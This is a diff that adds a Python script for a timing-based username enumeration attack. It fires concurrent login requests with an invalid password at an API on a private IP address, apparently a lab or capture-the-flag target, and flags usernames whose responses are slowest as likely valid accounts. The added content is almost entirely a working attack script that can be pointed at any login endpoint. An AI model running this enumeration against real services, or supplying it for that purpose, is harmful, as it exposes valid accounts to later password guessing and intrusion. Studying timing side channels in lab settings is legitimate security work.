@@ -47,3 +47,53 @@ for user, time in timings.items():
     if time >= largestTime * 0.9:
         # with 10% time tolerence
         print(user, "is likely to be valid")
+
+
+########################################################################
+#Faster timing script with progress bar using tqdm
+import requests
+import time
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from tqdm import tqdm
+
+URL = "http://10.201.30.66/api/user/login"
+USERNAME_FILE = "j_names.txt"
+INVALID_PASSWORD = "invalidPassword!"
+
+
+# Load usernames
+with open(USERNAME_FILE, "r") as f:
+    usernames = [line.strip() for line in f]
+
+timings = {}
+
+def doLogin(user):
+    start = time.time()
+    try:
+        response = requests.post(URL, json={"username": user, "password": INVALID_PASSWORD})
+    except Exception as e:
+        return user, float('inf')  # Treat errors as max time
+    end = time.time()
+    return user, end - start
+
+print("Starting parallel POST requests...")
+
+# Use ThreadPoolExecutor for concurrency
+with ThreadPoolExecutor(max_workers=20) as executor:
+    future_to_user = {executor.submit(doLogin, user): user for user in usernames}
+    for future in tqdm(as_completed(future_to_user), total=len(usernames)):
+        user, duration = future.result()
+        timings[user] = duration
+
+print("Finished POST requests")
+
+# Analyze timing results
+largest = max(timings.values())
+smallest = min(timings.values())
+print(f"Time delta: {largest - smallest:.4f} seconds (larger is better)")
+
+print("Likely valid usernames:")
+for user, duration in timings.items():
+    if duration >= largest * 0.9:
+        print(f"  {user} (time: {duration:.4f}s)")
+
